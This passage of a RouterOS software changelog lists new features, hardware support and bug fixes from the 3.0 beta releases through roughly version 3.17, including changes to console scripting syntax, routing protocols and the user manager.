*) fixed - during uptime 4:20 .. 5:00 interface traffic (byte and packet
   count) was being reported 100 times larger than the actual value;
*) provide L2TP server address in Called-Station-Id when doing authentication over RADIUS;
*) added support for Sierra Wireless MC8790;
*) recalibrated noise floor adjustment for R5H;
*) updated drivers & kernel - fixed fast clock issue on x86;

What's new in 3.17:

*) added support for Intel 10Gb PCI Express driver;
*) made Huawei E220 USB modem work again;
*) added support for Novatel Wireless Ovation MC950D HSUPA;
*) fixed PCQ fairness when pcq-total-limit is reached;
*) fixed fetch tool to work when dst-path is not specified (broken in 3.16);
*) fetch tool - added keep-result command line argument;
*) allow to specify routing-table for ping, trace-route, and telnet;
*) fixed an IPsec bug;
*) fixed /ip firewall address-list;
*) added propagate-ttl option for MPLS;
*) fix very long wireless scan-list issues;
*) fixed problem - sometimes PCQ could stop data pass-through if pcq-rate was set;
*) fixed problem - L2TP could stop working when one of clients stopped responding
   at wrong time;
*) fixed problem - reduced size of supout.rif files;
*) graphing - support for 10 Gbit interfaces;
*) routing-test - added support for multi-instance OSPF;
*) user manager - fixed bug for PayPal payments with long parameter list;
*) user manager - database load command supports external storage
    for temporary files;
*) user manager - added support for all UTC time-zone offsets, 
    including +5:30, +5:45, etc.;

What's new in 3.16:

*) added support for IGMP proxy;
*) improved Nstreme polling in wireless-test;
*) routing-test - routing filters now use regular expressions
   to match BGP AS_PATH; use '_' (underscore) to match any of:
   comma, space, beginning of line, end of line, parentheses, braces;
*) make secondary disk contents visible under /file;
*) console - allow use of '/' and '.' characters in backup, export
     and print output file names;
*) fixed bug - hotspot universal client did not work for clients
   with IP address ending with 127 or with 224-239;
*) fixed problem - x86 clock was 10 times faster then it should be on some boards;
*) fixed kernel panic on RB1000;
*) console - fixed wrapping of long lines in GNOME Terminal;
*) console - autodetect Mac OS X Leopard Terminal.app, fixes condition
    when only the bottom line of the terminal was used;
*) console - 'find' commands could not match some properties, like
    'routing-mark' of the '/ip route find' command. Fixed;

What's new in 3.15:

*) added workaround for non-standards compliant CPE with timestamp issue;
*) added ability to manage multiple disks & stores under /store;
*) added support for storing user-manager database on secondary media via /store;
*) /store should be used to set up secondary disk as web proxy cache;
*) added support for Mesh in WinBox;
*) fixed client roaming in mesh protocol;
*) fixed bug in MME routing protocol:
   routes sometimes were lost from routing table;
*) fixed some bugs in routing-test;
*) fixed traffic forwarding when VRF (virtual routing and forwarding) is used;
*) fixed problem - USB did not work on Geode LX boards;
*) fixed problem - farsync cards did not negotiate links;
*) added support for Novatel EU870D;
*) added support for Intel 82575EB & 8257GB gigabit ethernet PCI-Express cards;
*) removed support for all synchronous cards but farsync;
*) graphing - all target (source) addresses displayed in queue statistics page;
*) bridge firewall broute table is removed - it did not work as expected anyway;
*) ingress-priority matcher added to bridge firewall
*) fixed use-dns property of console traceroute command, default now is
    use-dns=no;
*) updated UK 5.8 FIXED regulatory domain info;
*) /system ssh now by default uses name of logged in user instead of "admin";
*) fixed support for some microSD cards on RB400;
*) include Relay-Session-ID in packets sent by PPPoE client if required;
*) added ability to specify src. address for radius client;
*) dns cache - improved static entry behavior;
*) fixed dial-on-demand on ppp interfaces;

What's new in 3.14:

*) fixed '/xen console' command;
*) fixed problem - queue bursts did not work;
*) added support for OSPF NSSA in routing-test;

What's new in 3.14rc1:

*) updated drivers, some of the changes:
   synchronous cards should work in frame relay mode;
   SIP connection tracking is more standards conformant;
   valid TCP connection packets will not be marked as invalid;
*) mlppp - fixed problem when small packets could not be transmited
    while more than 2 links were active;
*) bgp - fixed attribute flags checking;
*) fixed dhcp client - routes were not added back after lease expires 
   and then is acquired again;
*) fixed handling of multiple identical address-list entries
*) ospf could become unresponsive in some situations, fixed;
*) winbox - fixed problem: when moving multiple items at once,
   correct order was not maintained;
*) fixed automatic fan control on RB600;
*) added ipv6 firewall address-list;
*) fixed some bugs in mesh protocol driver;
*) fetch tool - added basic HTTP authentication;
*) 6to4 tunnel - allow to specify remote address; 

What's new in 3.13:

*) hotspot - fixed dst-nat for SMTP (broken in 3.11);
*) dhcp client - added support for DHCP option 121 (classless route);
*) fixed simple queues - changing simple queues could lock up i386 routers
*) routing-test - added support for multiple recursive nexthops;
*) routing-test - fixed BGP AS number byteorder, broken in 3.12;

What's new in 3.12:

*) fixed problem - static queues on PPPoE, PPTP, L2TP interfaces became invalid
   on client reconnect;
*) changed behaviour of simple queues - queues with no limit and type default-small
    and no children actually do not get installed, as if there was no queue;
*) console - allow "{}" array syntax only for some command arguments, as it
     does not make sense in most cases and interferes with the existing
     scripts. Now "/system script add source={....}" works as it did
     before 3.11;
*) graphing - fixed crash when dynamic interfaces/queues disappear;
*) fixed IPv6 address auto-configuration on routerboards;
*) added support for OSPFv3;
*) improved PCQ queueing algorithm;
*) dhcp server - pass Agent-Remote-Id and Agent-Circuit-Id to Radius server;
*) user manager - option to use test gateway for Authorize.Net payments;
*) fixed bug - web server could lock up at startup
    (no access to hotspot login page after that);
*) routing-test - added support for 4-octet BGP AS numbers;
*) routing-test - added default-originate feature for BGP peers;
*) routing-test - added IPv6 BGP networks and aggregates;

What's new in 3.11:

*) fixed bug - in some cases web proxy https with parent-proxy did not work;
*) added default-route-distance setting for DHCP client;
*) mesh protocol - bridge interface in a mesh did not work well, fixed;
*) multicast - fixed bootstrap router (BSR) mechanism;
*) user manager - users can now be redirected to HotSpot login page after 
    PayPal payment;
*) added ability to dst. nat only address or port, not both at the same time;
*) ospf - fixed default route;
*) ipsec - fixed tunnel mode with dynamically generated policy;
*) port remote-access - fixed allowed-addresses check;
*) ethernet half duplex modes on rb400 series work now;
*) console - fixed entering of IPv6 prefixes;
*) console - fixed crash on window size change;
*) console - bit operations (& ^ | << >>) now work with numbers, too;
*) console - brace syntax for array declarations ( { value ; value ; value } )
    now can be used also where () expressions can be used, previously
    worked only inside the expressions. Example:
      :foreach i in {1;2;3;4} do={:put $i}
*) console - inside expressions ',' operator can be used to concatenate arrays,
      unlike '.' which works with strings. Arguments that are not arrays are
      treated like arrays with single element. Example:
        {1,2,3;4,5,6;7,8,9} produces value {{1;2;3};{4;5;6};{7;8;9}}
        (1,{2},{{3;4}},5,{},{6,7},8) produces value {1;2;{3;4};5;{6;7},8}
*) console - 'move' commands no allow list of source items to be empty and
     to contain duplicate items. The porpose is to simplify scripts that use
     'find' commands to move items. Example:
        move ([find dynamic],[find inactive]) - moves all 'dynamic' and
	  'inactive' items to the end of the list, does not raise error if
	  any item is both 'dynamic' and 'inactive', or if there are no items;
*) console - 'move' command does not update item numbers anymore;

What's new in 3.10:

*) added Multilink PPP to PPPoE client - just specify multiple interfaces
   to enable it;
*) added ability to add dynamicly PPTP, L2TP & PPPoE client addresses
   to firewall address-list, specified in ppp profile,
   or via RADIUS in Mikrotik:19;
*) added address-list attribute support in user-manager;
*) added fan control for RB433;
*) added voltage monitor for RB433AH;
*) console:
    fixed 'interface wireless print detail', now shows the same output as
     'interface wireless print basic';
    fixed print to file, now writes complete contents, fixed resource leak;
    show name of running scripts in '/system script job', update
      'last-started' value;
    could not use item names for '/interface ovpn-server' and
      '/interface ovpn-client', fixed;
    fixed problems with export:
        some settings were not included in full export, such as
	  '/interface wireless nstreme');
	some settings had duplicate entries with an error, such as
	  '/system ntp client' when ntp package was enabled;
	long parameter values were incorrectly split across multiple lines;
    export now quotes all values that are split across multiple lines, it
      also adds line split before all newline characters, which improves
      readability of exported script sources;
*) api - some properties were included multiple times in getall responses;
*) port - properly tag all inactive ports;
*) port - fixed memory leak that was triggered by addition/removal of
    USB serial ports;
*) changed post-boot critical log messages - write a separate log entry
   explainig the cause of an non-administrative reboot, such as watchdog
   ping timeout, even if system rebooted cleanly;
*) fixed user-manager 'database rebuild' command to correct database errors;
*) fixed bug - user-manager customer password was not decoded 
   correctly when database backup was transferred 
   between Intel/RB100/RB500 and RB300/RB400/RB600/RB1000;
*) fixed bug - "/blink" command did not work on RB300/RB600/RB1000;
*) allow to configure OSPF authentication key ID;
*) allow to include bridge interface in a mesh interface;
*) ipsec - added Dead Peer Detection;
*) fixed some random crashes on RB411 & RB433;
*) fixed bug - OpenVPN could corrupt data on high load and force other end to disconnect;
*) fixed bug - DHCP server did not return DHCP options in response to 
   DHCPINFORM request;

What's new in 3.9:

*) bridge could make router busy even without traffic;
*) fixed route redistribution in RIP (bug introduced in 3.8);
*) fixed AR5212 kernel crash on setting change;

What's new in 3.8:

*) fix B mode rate reporting for Atheros 5211 cards;
*) IPv4-compatible addresses as IPv6 route gateways now require
   manually specified interface;
*) fixed removing external routes from OSPF;
*) added initial version of layer-2 mesh routing protocol;
*) fixed problem - OVPN server sometimes crashed;
*) fixed problem - torch could fail to aggregate connection data;
*) fixed problem - RB500 on high ethernet load rebooted sometimes;
*) fixed problem - if PPP (ISDN) client requested it's own address, then server
   did not report it in logs correctly;
*) fixed problem - if PPP (ISDN) client has it's own address, it was
   not used allways as on-demand ip address;
*) fixed problem - PPPoE, PPTP & L2TP stops receiving packets, if
   MRRU is set and multiple packets get lost;
*) added support for Intel Gigabit PCI-Express cards;
*) fixed problem - RB433 did not work with v3.7;

What's new in 3.7:

*) improved simple queue list updating;
*) fixed p2p edonkey protocol matcher on rb600;
*) fixed booting on CR;
*) fixed problem - CF did not work on routerboards;
*) fixed ping to 2001::1 like IPv6 addresses in console;
*) made ISDN work again;

What's new in 3.6:

*) fixed booting for x86;
*) initial support for MPLS Traffic Engineering tunnels;
*) added support for ZTE AC8700 USB modem;

What's new in 3.5:

*) updated drivers;
*) user manager - fixed bug when PayPal payments were discarded
   because of uppercase characters in business-id field;
*) fixed bug - could not ping ip address with 12 digits (like 123.123.12.12)
   in console;
*) console - changed behaviour of '.' operator when one or both of operands
    is an array, now it produces an array with all pairwise concatenated
    elements of left and right arrays. An example:
    if $A contains array 1,2,3,4, then
    :foreach i in="10.$A.$A.0/24" do={:put $i} will print 16 network prefixes.
    Currently behaviour of '.' operator  with an empty array value is
    undefined.
*) console - fixed bug introduced in 3.4. Concatenation of strings
    yielded array, so ("A" . "A") was A;A, now ("A" . "A") results in "AA",
    as before;
*) fixed web-proxy check drive command on routerboards;
*) console - fixed column widths;
*) console - fixed memory leak in 'find' command, introduced in last version;

What's new in 3.4:

*) improve transmit lockup detection to work around issues with few wireless 
    clients;
*) fixed bug - RB100/RB500 upgrade from RouterOS v2.9 could fail if 
    version 2.9 was installed by netinstall from v3;
*) console - compatibility syntax for 'find' and 'print where' expressions.
    If = or != operation has as the left operand name of item property, without
    leading '$', then right hand operand is parsed according to the syntax
    of that propery. This also adds back command line completions. Example:
      /ip address print where interface=ether1
    ether1 was parsed as a reference to variable "ether1", now it is parsed as
    name of the interface, like in version 2.9;
*) backup - proceed on read errors, log errors with topics "backup, critical";
*) console - allow commands like 'monitor' and '/tool fetch' in scheduler
    scripts;
*) web proxy - when src-address is specified, use it for outgoing connections;
*) fixed crash in pppoe, pptp & l2tp when using ip pools with radius server;
*) added support for Option Fusion UMTS Quad-GPRS (Vodafone Globetrotter);
*) fixed VLAN on wireless not running after reboot issue;

What's new in 3.3:

*) fixed SNMP DoS bug
*) fixed bug - PPPoE server could crash when running on multiple cores;
*) fixed bug - bridging over PPP interfaces with encryption enabled did not work;
*) fixed dhcp server - arp entries were not added after reboot;
*) fixed problem in pppoe, pptp & l2tp - server could restart;
*) fixed bug in console - bridge and ip filter "print static" and "print
    dynamic" commands had the opposite effect;
*) fixed bug - DHCP server did not parse Relay-Agent-Info option 82;
*) fixed bug - hotspot login could fail with "ippool acquire failed";
*) graphing - ip address formatting bugfix;
*) ospf - added support for Opaque LSA;
*) ospf - fixed routes changing type from Intra Area to AS External;
*) ospf - fixed multicast group membership in case there are
   multiple IP networks configured on a single interface;
*) routing - now iBGP routes are resolved through IGP and static by default;
*) user manager - fixed ampersand bug;
*) updated regulatory information for Australia;
*) updated drivers;

What's new in 3.2:

*) ssh - use preshared key also when user name has login parameters;
*) added ":led user-led=[yes|no]" command for RB300/RB600 series;
*) graphing - bugfixes; health section restored;
*) fixed problem - /ip traffic-flow could crash router
*) fixed simple queue vlan matching
*) fixed ipv6 firewall counters
*) user manager - fixed bug related to download/upload counter overflow
    in reports;
*) fixed problem - sometimes dhcp client could not renew lease
    on wireless interface;
*) fixed problem - connection tracking entries could not be removed sometimes;
*) ospf - don't install AS external routes with local address as gateway;
*) ospf - fixed bug triggered by adding and removing same AS external route
   on two routers; that route could always remain in OSPF routing table;
*) web proxy - compact flash and USB disks did not show up after reboot 
   on slow boards, fixed;
*) fixed wireless transmit lockup detection;

What's new in 3.1:

*) fixed wireless reassociation issue;
*) added support for Novatel Wireless Merlin XU870;
*) added support for nForce Ethernet cards;
*) fixed problem - user manager database in-use counter was wrong
     for database size over 21 MB;
*) console - fixed parsing of alphabetical operators ('and', 'or', 'in') in
    expression context, this also fixes default configuration revert script;
*) fixed TKIP on RB300 and RB600;
*) fixed ipv6 firewall connection-state matcher;
*) improved WinBox connection speed & memory usage;
*) report correct tcp-state for firewall connections;
*) fixed ppp user names in ip accounting;
*) fixed via vt6122 (rb600 ether3) driver: multicast packet receiving
   did not work properly;
*) user manager - voucher template supports kb/mb/gb for
    download/upload/transfer limit values;
*) added ":led user-led=[yes|no]" command for RB100/RB400/RB500 series;

What's new in 3.0:

*) fixed auto upgrade on RB333 & RB600;
*) made RB411 bootup more stable;
*) made DNS & WINS setting work again in PPP;
*) fixed bug - dhcp client did not update NTP server list;

What's new in 3.0rc14:

*) fixed locking up in PPPoE server;
*) fixed bridging in PPTP, L2TP an PPPoE;
*) fixed bug - MPPE encryption keys received from RADIUS server were decoded
   improperly on RB333;
*) added support for BGP signalled VPLS;
*) fixed bug in port remote-access - it was inserting random data, mostly
   nulls, in data sent to serial port and to tcp connection;
*) fixed bug in console error propagation, code like the example below caused
   console to enter busy loop:
     :do { badcommandname; } while=(true);
*) fixed hotspot https walled-garden;
*) fixed bug - dhcp server failed to give out options with code > 127;
*) console - fixed numeric parameters that accept negative values, were broken
   in rc12;
*) fixed port line-state values on MIPS RouterBoards;
*) fixed bug - idle-timeout & session-timeout were not disabled if they
   were unset in ppp profiles;
*) fixed OSPF compatibility bug with v2.9 (and some other vendor 
   implementations): LS Acknowledgments were sent to wrong address;
*) fixed Broadcast flag for DHCP on RB300/RB600;
*) fix wireless nstreme packing problem;
*) improved layer7 firewall matcher memory usage;
*) console - do not add input to history if it is the same as previous line;
*) fixed bridge to forward (R)STP frames as regular if (R)STP not enabled;
*) fixed bug - configuration for missing serial ports was not tagged inactive;
*) console - fixed safe mode, it was causing wery high cpu usage and terminal
   traffic;
*) console - added login parameters, passed as part of login name, after '+';
    can be used to disable colors (+c) and terminal autodetection (+t), e.g.
    "admin+ct";
*) fixed problem - bandwidth shaping on ARES traffic was not working properly;
*) user manager - fixed security bug in user page;
*) dns resolver has configurable max UDP packet size;
*) fixed dns resolver - tcp queries were broken without ipv6 package;
*) added ingress priority matcher to firewall rules;
*) added number of active pcq queues to queue stats;
*) made advanced mode for wireless interface configuration in WinBox;

What's new in 3.0rc13:

*) fixed problem - clean install on x86 & adding new ethernet interfaces on x86
   did not work (introduced in 3.0rc12);

What's new in 3.0rc12:

*) added support for MPLS & VPLS;
*) added ability to specify & disable winbox port under "/ip services";
*) fixed bug - DFS was not taking into account channel usage when
   selecting channel;
*) fixed bug - simultaneously monitoring wireless interface and changing
   settings could cause crash;
*) improved memory usage under RB133C;
*) fixed bug - MAC Winbox connection was not very stable;
*) fixed bug in graphing;
*) fixed problem - routerboard sometimes did not upgrade & reboot
   if serial cable was not plugged in;
*) interface routing now works with PPPoE 'dial-on-demand' interfaces;
*) fixed dial-on-demand;
*) routing - fixed 'set-in-nexthop' filter (broken in 3.0rc7);
*) implemented more registered client flushing on access-list and
   connect-list changes - now connect-list changes disconnect
   affected APs, wildcard mac address entry changes disconnect all
   clients;
*) fixed bug - Windows could not synchronize to NTP server if local 
   clock was used as time source (changed stratum from 6 to 4);

What's new in 3.0rc11:

*) added filters to WinBox lists, and added ability to filter routes
   without downloading all of them to the client;
*) updated WinBox Loader to v2.2.12 - clicking on IP address in
   router discovery list selects ip address not mac address;
*) added '/tool sms send' in advanced-tools package;
*) fixed problem - PPPoE, PPTP, L2TP could restart if user disconnected
   at wrong time;
*) fixed problem - PPPoE, PPTP, L2TP static server interfaces
   disappeared after disconnect;
*) added support for adding OVPN interfaces to bridge through specifying
   bridge in ppp profile;
*) multicast - fixed IGMP Leave message handling;
*) nand improvement for RB532A;
*) fixed user-manager database restore from backup for RB500;
*) fixed bonding - when bonding iface was put in bridge arp link monitoring
   did not work properly;

What's new in 3.0rc10:

*) fixed problem - sometimes PPTP, L2TP, PPPoE and OpenVPN connections
   were not accounted properly, and no new connections could be established;
*) fixed problem - L2TP sometimes could not establish connections through
   firewall or with Windows;
*) bgp - fixed TCP MD5 authentication on RB300;
*) fixed bug - route did not work with Level 1 license and routing package enabled;
*) api - '/quit' command now immediately terminates session;
*) console:
     'and' operator in expressions that follow 'find' and 'print where'
       now is optional, pre-rc9 syntax 'find mtu=1480 type=ether' works
       as it used to;
     added back filters to firewall print commands, filtering by chain
       now is 'print chain=input' instead of 'print input';
     fixed 'print count-only', it was ignoring any additional 'print' arguments
       that selected only part of items;

What's new in 3.0rc9:

*) fix for rb100 - can change ethernet settings when interface in bridge/bond;
*) fixed problem - RouterOS did not boot on some routers
   (reported disk not found);
*) fixed dns resolver - sometimes could not parse packets with AAAA records;
*) hide ppp interface & wireless passwords and keys in WinBox as well;
*) fixed traffic-flow - could hang multi cpu router and ignore targets sometimes;
*) fixed rb100 - ethernets could be set at random bandwidth limit after reboot;
*) console:
     repaint whole screen after terminal size change while in editor
       (same as pressing F5 or Ctrl-L). this solves numerous issues with
       terminal resizing;
     added more workarounds for the case when terminal is too narrow
       (<4 characters);
     now logical operators '&&' and '||' can also be written as 'and' and 'or';
     removed 'where' and 'from' arguments of find command. now find command
       can be followed by arbitrary expression that can use item properties,
       e.g. "find dst-address in 192.168.0.0/16 and interface=wlan1";
     added 'where' argument to print command. "print where <expr>" and
       "print from=[find <expr>]" are equal;
     removed filters from firewall print commands, now write, e.g.,
       "/ip firewall filter print where !dynamic" instead of
       "/ip firewall filter print static";
*) web proxy: fixed crash on stopping proxy;

What's new in 3.0rc8:

*) fixed problem - console did not accept ip address ranges correctly;
*) user manager - fixed problem with accounting creating too many sessions;
*) console:
     added ip-prefix and ip6-prefix datatypes, written in address/mask
       notation;
     INCOMPATIBLE CHANGE: expressions of the form "(123/45)" (where first
       operand is literal unquoted value) currently will be parsed as single
       string, to write division put space before '/' (like with '.' operator);
     added operator 'in' that checks if first argument is inside second
       argument, currenty implemented for the case where second argument is
       ip-prefix or ip6-prefix and first argument is either address or
       another prefix;
     don't perform full reset of terminal on login;
     fixed terminal capability detection, now windows telnet client
       works better. TERM environment variable is ignored completely now,
       it was overriding detected values before;
*) added support for Huawei E220 USB modem;

What's new in 3.0rc7:

*) ftpd - automatically reboot after finishing upload that has name *.auto.npk;
*) added support for Sierra Wireless AirCard 595U;
*) ping - show more types of ICMP reply messages, like in 2.9 versions;
*) add ICMP MPLS extension support to traceroute;
*) console detects terminal size and capabilities, TERM environment
     variable is not used, so now this works even over serial;
*) console - fixed crash on non-ASCII characters in input and output;
*) console - export correctly strings that contain control characters;
*) fixed in console - when argument value evaluation produces error, report
     that error instead of "invalid value for ..." message;
*) console - changed the way how required command arguments are processed,
     now commands like "enable [find]" don't fail with error when find returns
     nothing;
*) fixed memory leak on RB500;
*) fixed layer7 protocol matcher, did not handle \x.. sequences correctly;
*) fixed allow-shared-key mode for wireless;
*) fixed station-pseudobridge mode when used in combination with
   nstreme framer-policy;
*) fixed hidden ssid issues with wds links;
*) SNTP client - adjust DST according to timezone settings when clock changes;
*) console - fixed crash when terminal size is extremely small (like 1x1),
     assume default width 80 if terminal is too narrow;
*) SNTP - fixed overflow bug, now clocks are adjusted correctly if initial
     time is way back (like jan/01/1970 on routerboards);
*) added RIPng support in WinBox;
*) added BGP for IPv6 support in WinBox;
*) added PIM support in WinBox;
*) added hide passwords option to WinBox;
*) added regular expression matching to dns resolver static entries;
*) user manager - fixed bug for credit extension using PayPal payments;

What's new in 3.0rc6:

*) RIP - fixed some problems;
*) RIP - automatically distribute connected routes
   falling within range of some configured network;
*) RIPng - network configuration statements removed,
   interface configuration now is mandatory;
*) added support for IPv6 Firewall in WinBox;
*) added support for IPv6 DNS cache in WinBox;
*) added support for MME routing protocol in WinBox;
*) added support for L7 matcher in WinBox;
*) added support for Prolific 2303 based USB serial devices;
*) specify tcp-mss in dynamicly added PPP mangle rules & do not add
   them when mtu is bigger then 1500;
*) fixed USB UPS detection;
*) fixed bug - PPTP client did not work with Windows PPTP server;
*) limited number of active authentication sessions for PPPoE server
   to not overload RADIUS server;
*) fixed bug - ssh command did not work on RB333;
*) added support for Intel EXPI9404PT PCI-E ethernet adpater;
*) added simple SNTP client to system package
   & removed regular ntp from bundle package;
*) updated timezone information;

What's new in 3.0rc5:

*) added layer7 protocol matching capability in firewall;
*) updated network drivers;
*) make external-fdb for station-wds interfaces be disabled when
   in auto mode;
*) added regulatory domain info for 5.8GHz band in Germany;
*) rip - fixed netmask for default route;
*) added /system default-configuration;
*) ability to reset without applying default configuration;
*) reverted BGP network behaviour back to version 2.9;
*) fixed BCP;
*) fixed PPPoE, PPTP, L2TP problems with remote authentication;
*) made Multi-Link over single link work properly in PPTP & L2TP;
*) improved ares/warez p2p protocol matching
*) ospf - fixed MD5 authentication;
*) console - fixed memory leak in 'find' command;
*) fixed ip accounting;
*) user manager - customers can configure Authorize.Net title shown to users;

What's new in 3.0rc4:

*) fixed bug - OpenVPN key renegotiation did not work;
*) updated 5ghz regulatory information for Romania, South Africa and Ireland;
*) added support for dynamic bridge port adding and path cost update for
   station-wds mode;
*) fixed rb500 korina driver (ether1) transmit issue;
*) improved wireless performance (also with 2.9);
*) improved nstreme2 performance;

What's new in 3.0rc3:

*) user manager - added PayPal options (https-response & accept-pending);
*) user manager - added transfer-limit to user batch-add form;
*) user manager - added download, upload and total transfer to CSV;
*) added 5GHz turbo band for Germany and Italy;
*) added 'host' argument to 'fetch' tool to support virtual hosts;
*) fixed handling of power saving wireless clients;
*) ftpd - automatically execute uploaded scripts that have name *.auto.rsc;
*) fixed bug - BCP could not be negotiated with some Cisco's;
*) fixed bug - PPTP & L2TP did not work on RB333;

What's new in 3.0rc2:

*) added RFC 2217 server (configure under '/port remote-access');
*) renamed 'get' tool to 'fetch', avoids confusion with builtin 'get' commands;
*) ospf - added 'passive' interface flag;
*) ups - fixed duplicate logging of line power state;
*) fixed bios upgrade from RouterOS on RB200;
*) added switch support for rb1xx;
*) added support for ipv6 firewall;
*) added ipv6 support to dns cache;

New features commentary:

*) installation and boot of USB sticks/drives with RouterOS
   Netinstall can now install RouterOS on USB drives.  Minitowers 
   and rackmounts with bios's that support USB boot can now easily boot 
   from USB flash/hard drives.  The USB flash sticks are available in 
   most electronics stores and are a suitable replacement from IDE 
   flashdrives and CF with IDE adaptors.  It might be advisable to find 
   a secure place to connect the USB stick so that it can't be knocked 
   off easily.  As of v3rc2,there is one problem that you should not 
   have a hard drive with RouterOS in the same system or the boot 
   program on the USB drive will find the hard drive with RouterOS and 
   probably boot that instead of the RouterOS on the USB stick -- we 
   will work on fixing this.
*) RFC 2217 serial server TCP to serial
   Now you can set the serial port to RFC 2217 server mode and 
   you can use a remote application to communicate/control the serial device.
   Find out more about this protocol at http://www.faqs.org/rfcs/rfc2217.html

What's new in 3.0rc1:

*) enable routing package on upgrade - to fix upgrade from 2.9 version 
   where routing-test package was used;
*) console - parser now accepts newlines as CR, LF, CR+LF, this fixes import;
*) user manager - using +/- image for group field show/hide instead of
    confusing checkbox;
*) fixed bug - usb devices did not work;
*) console - added tab key completions in editor;
*) fixed slowness of RB112/RB133C during bootup (introduced in 3.0beta9);
*) console - fixed variable name lookup;
*) console - added back '/setup' command;
*) console - added '/system script environment';
*) console - fixed wireless interface configuration export;
*) integrated MAC Ping in to regular Ping in WinBox;
*) added support for Marvell IDE controller that is embeded in new Intel motherboards;
*) fixed bug - for routes received via RIP nexthop was invalid in some cases;
*) added 'get' tool for downloading files to router via HTTP or FTP;
*) console - some properties could not be set via API, fixed;
*) user manager - fixed bug for PayPal payments with user data containing
   specific characters;
*) ip proxy - setting parent proxy did not work;
*) fixed bug - dst-active was not updated after time update by NTP;
*) console:
     fixed 'do' arguments in '/tool bandwidth-test' and other
       commands;
     inside expressions variables can be referenced without putting
       '$' before variable name;
     'find' commands have new argument 'where' that allows to write
       filtering condition as console expression;
     when entering commands from prompt, global variables can be used without
       declaring them;

What's new in 3.0beta10:

*) ip proxy - fixed crash; fixed HTTP POST method handling;
*) fixed PCMCIA (non CARDBUS mode);
*) fixed ethernet packet accounting (FCS 4 bytes were not included);
*) ospf - fixed external and inter-area routes;
*) ospf - after Dijkstra's algorithm was executed 256 times,
   intra-area routes become invalid;
*) made Torch to not exlcude non TCP & UDP traffic if no specific port was provided;
*) user manager - added download/upload limit and group fields to batch-add form;
*) updated Realtek 8169 driver;
*) added support for radius-mac-authentication result caching in wireless;
*) fixed SIP connection tracking on RB100 & RB500;
*) added support for Novatel Wireless V740 Verizon;
*) wireless - added configuration option for hardware retries count and
   frame transmit lifetime;
*) fixed support for MTB-134 / Portwell EZIO LCD display;
*) added initial IPv6 support;
*) added radius client to send Accounting-On packet on startup;
*) added initial calea support;
*) added ethernet bridging support to PPP, PPTP, L2TP & PPPoE;
*) added MRRU support to PPP, PPTP, L2TP & PPPoE - packets bigger than MTU
   can be forwarded;
*) user-manager - 3-byte char (UTF-8) bugfix;
	
What's new in 3.0beta9:

*) console - removed undocumented scripting commands;
*) console - variable lookup now is done while parsing script:
     variable name completion works
     variables must be declared before use;
*) some of the fixes mentioned under v3.0beta8, did not got in v3.0beta8,
   they are fixed now;

What's new in 3.0beta8:

*) use less memory - makes RB133C & RB112 work better;
*) added initial support for OpenVPN (client & server mode);
*) added support for Sierra Aircard 595 & other Sierra Wireless cards;
*) ipsec - fixed tunnel mode;
*) fixed bug - bridging with bandwidth shaping could freeze whole system;
*) ip proxy - allow setting invalid parent-proxy-port value 0 in console.
     this fixes import of default settings;
*) ip proxy - fixed bugs introduced in 3.0beta6 (proxy could crash,
     cache was not working correctly);
*) support for full frequency list of Atheros chips;
*) ups - fixed: program was becoming unresponsive when serial ups was
     configured but was not connected;
*) user manager - password not revealed on sign-up;
*) console - each user has separate set of global variables;
*) console - fixed crashes when exporting "/system health" on non-routerboards;
*) console - removed unexpected entries from export (like /file);
*) policy routing - fixed automatically added rules;


What's new in 3.0beta7:

*) certificates - sometimes when importing CA certificate, certificate
     cache was reset. Fixed;
*) fixed RB200 bios upgrade from RouterOS;
*) added reset-configuration command for wireless;
*) user manager - user signup bugfix;
*) fixed RouterOS configuration to reset when "Soft Reset" jumper on 
   RB133C or JP1 on RB532r5 is shorted;
*) hotspot - added to retry mac authentication in case of radius timeout;
*) hotspot - added total (in + out) byte limit;
*) fixed wireless sniffer file format;
*) work around bugs in some WPA2 implementations that do not do
   proper group key updates;
*) routing - added set-in-nexthop and set-out-nexthop filters;
*) routing - added notification when filters are changed for
   RIP and OSPF (affects redistributed routes)
*) routing - added MME routing protocol;
*) user manager - added total transfer (download + upload) byte limit;
*) WMM support;
*) TOS matcher in firewall is replaced with DSCP;

What's new in 3.0beta6:

*) WinBox has ability to search in Tables;
*) RSTP bridge package is now merged in to system package;
*) routing-test package is renamed to routing;
*) console - fixed "" to have type str;
*) console - reverted change to export script sources in '{}' braces, such
     export was not 100% reversible;
*) hotspot - added option to specify any password for mac authentication;
*) added support for interface routes (without nexthop);
*) route deletion from route table now is much faster (important for
   full feed BGP);
*) added update-source option for BGP;
*) RIP is rewritten; added passive-interface option for RIP;
*) added /routing prefix-lists; they can be used for RIP filtering; 
*) webproxy now supports SATA disks;
*) fixed bug - OS could not be installed on SATA disks without license;
*) added support for more network cards based on RTL8169 chip;
*) console - F5 or ^L key in commandline resets terminal and prints current
     input buffer (if it does not fit in one line);
*) console - fixed backslash whitespace sequence inside quoted string
     to expand to nothing, as in 2.9;
*) console - fixed completions and help while editing multiline commands;
*) console - prompt for continuation lines now shows open braces and quotes;
*) console - added 'as-value' option to print and monitor commands that
     suppresses normal output and returns array of properties instead;
*) console - 'get' command without 'value-name' returns array with all
     item properties;
*) console - fixed crash in fullscreen editor when adding empty at the end;
*) console - readded 2.9 style help;
*) made WRAP board rebooting work;
*) user manager - added Authorize.Net payments;
*) user manager - prices now stored as decimals;
*) user manager - increased active session count limit for license levels 4 and 5;
*) user manager - object removal confirmation;
*) user manager - CSV files now have header;
*) user manager - popup-blocker workaround for CSV;
*) user manager - close option for active sessions;
*) user manager - reset-counters option for routers;
*) user manager - public-host field for customers;
*) user manager - group field for users;
*) user manager - fixed time-zone bug;
*) user manager - added PayPal payments;
*) user manager - utf-8 handling bugfix;
*) user manager - voucher customization;
*) new vrrp implementation
*) graphing - incorrect scale legend bugfix for large data amounts;

What's new in v3.0beta5:

*) console - fixed prompt for continuation lines to be "... ";
*) e-mail - changed to send address-literal instead of hostname in EHLO;
*) e-mail - added e-mail,debug and e-mail,warning log topics, errors now go to
     system,e-mail,error;
*) console - fixed 'get' commands, were not reporting flag values;
*) console - removed :list command;
*) updated network drivers;
*) console - multiline command editing:
     Ctrl-\ splits line,
     prompt shows current line number and total number of lines
       when more than one,
     home/end twice goes to beginning/end of command like in
       fullscreen editor;
   console - edit command works also in single line input mode;
   console - 'source' argument in '/system script' and 'do' arguments in
     various monitor commands accept scripts written in '{}' braces. export
     uses this syntax to output scripts;

What's new in v3.0beta4:

*) added GIS/WISPr xml pages for hotspot smart client support;
*) console - order export items by dependencies.
